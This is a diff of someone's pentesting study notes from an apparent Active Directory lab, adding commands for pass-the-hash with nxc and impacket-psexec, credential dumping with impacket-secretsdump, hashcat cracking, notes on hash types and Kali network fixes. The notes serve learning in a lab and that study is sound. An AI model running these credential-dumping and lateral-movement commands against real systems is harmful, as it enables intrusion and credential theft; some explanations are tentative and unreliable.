@@ -141,12 +141,31 @@ hashcat -m 1000 -a 0 fixes_hashes_sam_dump.txt $ROCKYOU
 nxc smb 192.168.1.0/24 -u "Peter Parker" -H 58a478135a93ac3bf058a5ea0e8fdb71 --local-auth # Requirtes only new NT hash
 # Using "Frank Castle" didn't work, but because the user password had expired and needed to be updated
 impacket-psexec "Frank Castle":@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a2 # Requires LM+NT hash
+# Failed because it typically needs access to the $ADMIN or $C shares, which are typically restricted to the built-in local Administrator account
+# SVCManager
+# Windows strips local admin of admin priviilegs (more accurate framing needed), when connecting remotely through UAC limitinh access to C$ and ADMIN$ Shares. BUT Domain accounts don't. 
+Use mimikatz potentially to steal a domain hash, then use it in PtH and succeed at impacket-psexec
+# Mimikatz didn't seem to work, failed, check later
+impacket-secretsdump MARVEL.local/fcastle:Password1@192.168.1.100
+
+https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/cached-domain-credentials
+
 Note:
 # LM hash (VERY outdated and bad)
 # NT hash (Hashes of local accounts. In SAM. Can be used in PtH. Can also be cracked.) #TODO, does it also store network account hashes? 
 # SAM stored hash has LM:NT stored as both hashes. The LM hash is generic and same
 # NetNTLMv1 and NetNTLMv2 hash (Hash used during NTLM auth over network, can't be used for PtH, can still be cracked. Can be relayed). 
 # NetNTLMv1 hashes are older and easier to crack. Both use  HMAC-MD5 to hash
+
+SUPER HUGE NOTE:
+KALI VM may choose internal network adapter for services like firefox, brickign them temporarily
+A crude buit effective solution is:
+sudo ip link set eth1 down && sudo ip link set eth0 up
+# To reverse
+sudo ip link set eth1 up # You can turn it on again after one search in firefox that works
+
+Impersonating Tokens
+
 
 Kerberos fix Kali
 sudo timedatectl set-ntp off
